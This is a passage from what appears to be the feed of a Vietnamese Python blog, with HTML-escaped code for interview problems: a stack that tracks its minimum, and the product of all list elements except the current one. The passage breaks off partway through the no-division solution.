    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;del&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;peek&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__bool__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;StackWithMin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;StackBase&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;StackBase&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mins&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mins&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;peek&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mins&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mins&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;peek&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mins&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mins&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;peek&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="cach-giai-o-1-cho-pop-cai-tien"&gt;
&lt;h3&gt;Cách giải O(1) cho &lt;strong&gt;pop&lt;/strong&gt; cải tiến&lt;/h3&gt;
&lt;p&gt;Cách giải trên tráo đổi &lt;strong&gt;O(1)&lt;/strong&gt; bộ nhớ và &lt;strong&gt;O(n)&lt;/strong&gt; thời gian cho &lt;strong&gt;O(n)&lt;/strong&gt; bộ nhớ và &lt;strong&gt;O(1)&lt;/strong&gt; thời gian.&lt;/p&gt;
&lt;p&gt;Vấn đề dẫn đến &lt;strong&gt;O(n)&lt;/strong&gt; bộ nhớ là do ở mỗi lần &lt;strong&gt;push&lt;/strong&gt; ta cũng lưu lại giá trị cực tiểu của các phần tử hiện tại. Nếu như ta chỉ lưu &lt;strong&gt;vị trí&lt;/strong&gt; của phần tử cực tiểu, thì ta sẽ tiết kiệm được bộ nhớ một chút. Ta chỉ cần lưu lại vị trí của phần tử cực tiểu mới, nếu vị trí này khác với vị trí hiện tại. Khi &lt;strong&gt;pop&lt;/strong&gt; ra, nếu số lượng phần tử hiện tại ít hơn vị trí của phần tử cực tiểu thì ta cũng &lt;strong&gt;pop&lt;/strong&gt; luôn vị trí này ra khỏi ngăn xếp thứ hai. Điều này đảm bảo điều kiện bất biến &lt;strong&gt;vị trí của phần tử cực tiểu luôn luôn nhỏ hơn số lượng phần tử trong ngăn xếp&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Cài đặt này xin được để dành làm một thử thách nhỏ cho bạn đọc. &lt;a class="reference external" href="forum.vithon.org"&gt;Diễn đàn&lt;/a&gt; là nơi tốt nhất để bạn đọc trao đổi thêm.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</content><category term="interview"></category></entry><entry><title>Phỏng vấn: Tìm tích của mọi phần tử trừ phần tử hiện tại</title><link href="/2015/03/phong-van-tim-tich-cua-moi-phan-tu-tru-phan-tu-hien-tai.html" rel="alternate"></link><published>2015-03-08T07:05:00+07:00</published><updated>2015-03-08T07:05:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-03-08:/2015/03/phong-van-tim-tich-cua-moi-phan-tu-tru-phan-tu-hien-tai.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một danh sách các số thực &lt;strong&gt;A&lt;/strong&gt;, trả về một danh sách trong đó phần tử tại vị trí &lt;strong&gt;i&lt;/strong&gt; có giá trị là tích của các phần tử không phải ở vị trí &lt;strong&gt;i&lt;/strong&gt; trong danh sách &lt;strong&gt;A&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;div class="section" id="truong-hop-ngoai-le"&gt;
&lt;h3&gt;Trường hợp ngoại lệ&lt;/h3&gt;
&lt;p&gt;Nếu &lt;strong&gt;A …&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một danh sách các số thực &lt;strong&gt;A&lt;/strong&gt;, trả về một danh sách trong đó phần tử tại vị trí &lt;strong&gt;i&lt;/strong&gt; có giá trị là tích của các phần tử không phải ở vị trí &lt;strong&gt;i&lt;/strong&gt; trong danh sách &lt;strong&gt;A&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;div class="section" id="truong-hop-ngoai-le"&gt;
&lt;h3&gt;Trường hợp ngoại lệ&lt;/h3&gt;
&lt;p&gt;Nếu &lt;strong&gt;A&lt;/strong&gt; chỉ có một phần tử thì giá trị trả về sẽ là gì? Người đi phỏng vấn phải hỏi ngược lại được người phỏng vấn trường hợp này.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cach-giai-don-gian"&gt;
&lt;h3&gt;Cách giải đơn giản&lt;/h3&gt;
&lt;p&gt;Cách giải đơn giản nhất là ta thực hiện hai vòng lặp để tính giá trị của từng phần tử của danh sách &lt;strong&gt;B&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*=&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Cách giải này có độ phức tạp là &lt;strong&gt;O(n^2)&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cach-giai-o-n"&gt;
&lt;h3&gt;Cách giải O(n)&lt;/h3&gt;
&lt;p&gt;Có hai nhận xét đơn giản sau:&lt;/p&gt;
&lt;blockquote&gt;
# Nếu như trong số phần tử còn lại có giá trị 0, thì tích số cũng sẽ là 0.
# Giá trị của &lt;strong&gt;B[i]&lt;/strong&gt; sẽ là tích của toàn bộ các phần tử trong &lt;strong&gt;A&lt;/strong&gt;, chia cho &lt;strong&gt;A[i]&lt;/strong&gt;. Ta có thể tính tích của toàn bộ các phần tử trong &lt;strong&gt;A&lt;/strong&gt; qua một vòng lặp, và dùng một vòng lặp khác để tính từng giá trị của &lt;strong&gt;B&lt;/strong&gt;.&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;nr_zeros&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
  &lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;nr_zeros&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="o"&gt;*=&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;nr_zeros&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt;
    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;nr_zeros&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="cach-giai-khong-dung-phep-chia"&gt;
&lt;h3&gt;Cách giải không dùng phép chia&lt;/h3&gt;
&lt;p&gt;Ta nhận thấy rằng &lt;strong&gt;B[i]&lt;/strong&gt; là tích của các phần tử từ &lt;strong&gt;0&lt;/strong&gt; đến &lt;strong&gt;i-1&lt;/strong&gt; và từ &lt;strong&gt;i+1&lt;/strong&gt; đến &lt;strong&gt;n&lt;/strong&gt; của &lt;strong&gt;A&lt;/strong&gt; (với &lt;strong&gt;n&lt;/strong&gt; là số phần tử trong A). Nói một cách khác, giá trị trong &lt;strong&gt;B&lt;/strong&gt; là &lt;strong&gt;tích của hai phần liên tục từ bên trái, và từ bên phải của A&lt;/strong&gt;. Do đó, ta sẽ sử dụng hai danh sách tạm &lt;strong&gt;left_product&lt;/strong&gt; và &lt;strong&gt;right_product&lt;/strong&gt; để chứa tích các phần tử trong &lt;strong&gt;A&lt;/strong&gt; từ bên trái, và từ bên phải, loại trừ phần tử đang xét.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;left_product&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;right_product&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
    &lt;span class="n"&gt;left_product&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;left_product&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;right_product&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;right_product&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
